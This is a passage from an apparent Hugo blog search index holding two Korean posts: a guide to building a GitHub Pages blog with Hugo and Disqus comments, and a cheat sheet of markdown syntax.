//적용할 테마명을 넣는다.(필수!!) // 나머지 설정은 테마에 따라 설정이 달라진다. // theme에 저장한 theme의 config.toml을 참조해서 수정하면 될 듯 하다. 6. 글작성 % hugo new \u0026lt;폴더명\u0026gt;/[md파일명].md //content/\u0026lt;폴더명\u0026gt;/[md파일명].md 에 파일 생성 됨. % vi content/\u0026lt;폴더명\u0026gt;/[md파일명].md //글 쓰기 % hugo -D //static 파일을 생성한다. md파일을 명령어 실행 후 아래와 같이 파일 내용이 작성된다. categories,tags는 원할 경우 아래와 같이 추가해서 사용해야함.\n  -\u0026ndash;\ntitle: \u0026ldquo;제목\u0026rdquo;\ndate: 날짜\ndraft: true // false는 비공개 글.\ncategories: [\u0026ldquo;category명\u0026rdquo;]\ntags: [\u0026ldquo;tag명\u0026rdquo;]\n-\u0026ndash;\n  7. hugo git에 반영 아래 명령어 순서대로 입력\n\u0026lt;hugo디렉토리명\u0026gt; % hugo -t soho \u0026lt;hugo디렉토리명\u0026gt; % hugo -D \u0026lt;hugo디렉토리명\u0026gt; % cd ./public \u0026lt;hugo디렉토리명\u0026gt;/public % git add . \u0026lt;hugo디렉토리명\u0026gt;/public % git commit -m \u0026quot;$msg\u0026quot; \u0026lt;hugo디렉토리명\u0026gt;/public % git push origin master \u0026lt;hugo디렉토리명\u0026gt;/public % cd .. \u0026lt;hugo디렉토리명\u0026gt; % git add . \u0026lt;hugo디렉토리명\u0026gt; % git commit -m \u0026quot;$msg\u0026quot; \u0026lt;hugo디렉토리명\u0026gt; % git push origin master 8. Disqus Comment 추가하기 8.1 Disqus 가입 후 Setting 클릭  Disqus \n8.2 Profile, Account 작성  Disqus \n8.3 Home으로 이동 후 Get Started 클릭  Disqus \n8.4 I want to install Disqus on my site 클릭  Disqus \n8.5 Create a new site 작성  Disqus \n8.6 화면을 조금 내리서 Basic에 Subscribe Now 클릭(돈많으면\u0026hellip;돈내고쓰세요\u0026hellip;ㅠㅠ)  Disqus \n8.7 화면을 조금 내려서 아래 버튼 클릭(hugo는 지원목록에 없다. 추가될수도..?) ![Disqus](https://github.com/Appealso/Appealso.github.io/blob/master/images/disqus/Disqu 8.png?raw=true)\n8.8 configure 클릭  Disqus \n8.9 사이트 정보 기입  Disqus \n8.10 완료!  Disqus \n8.11 config.toml 수정 % vi config.toml disqusShortname = \u0026quot;\u0026lt;Disqus shortname\u0026gt;\u0026quot; 8.11.1 short name 확인방법  Disqus \n Disqus \n 수정중\u0026hellip;20.12.21 ~ ing\n","date":"2020-12-21T20:45:37+09:00","permalink":"https://appealso.github.io/p/githubio-hugo-theme-blog-%EA%B5%AC%EC%B6%95%EA%B8%B0./","title":"Githubio+hugo Theme Blog 구축기."},{"content":"Mark Down의 기본 문법을 정리\n1. 제목 # h1제목 ## h2제목 ### h3제목 #### h4제목 ##### h5제목 ###### h6제목 h1제목 h2제목 h3제목 h4제목 h5제목 h6제목  2. 수평선 * * * *** _ _ _ ---  3. 글자강조 **굵게** __이탤릭__ ~~취소선~~ 굵게\n이탤릭\n취소선\n 4. 인용문 \u0026gt;첫번째 \u0026gt;\u0026gt;두번째 \u0026gt;\u0026gt;\u0026gt;세번째  첫번째 인용문\n 두번째 인용문\n 세번째 인용문\n  다시 첫번째\n  5. 이미지 ![이미지이름](이미지 주소)  달려라춘식! \n 6.글자색 \u0026lt;span style=\u0026quot;color:red\u0026quot;\u0026gt;붉은 색\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026quot;color:blue\u0026quot;\u0026gt;파란 색\u0026lt;/span\u0026gt; 붉은 색파란 색 7. 마크다운 이스케이프 \\*\\*강조\\*\\* **강조**\n 8.코여블록  ```언어이름소문자\npublic static void main(String[] args){\nSystem.out.println(\u0026ldquo;Hello Wolrd\u0026rdquo;);\n}\n```\n public static void main(String[] args){ System.out.println(\u0026#34;Hello Wolrd\u0026#34;); }  9.링크 \u0026lt;링크주소\u0026gt; ex) \u0026lt;https://www.naver.com\u0026gt; [링크명](링크주소) ex) [네이버](https://www.naver.com) https://www.naver.com\n네이버\n 수정중ㅎㅎ","date":"2020-12-20T20:19:13+09:00","permalink":"https://appealso.github.io/p/%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4-%EC%9E%91%EC%84%B1%EB%B2%95/","title":"마크다운 작성법"}]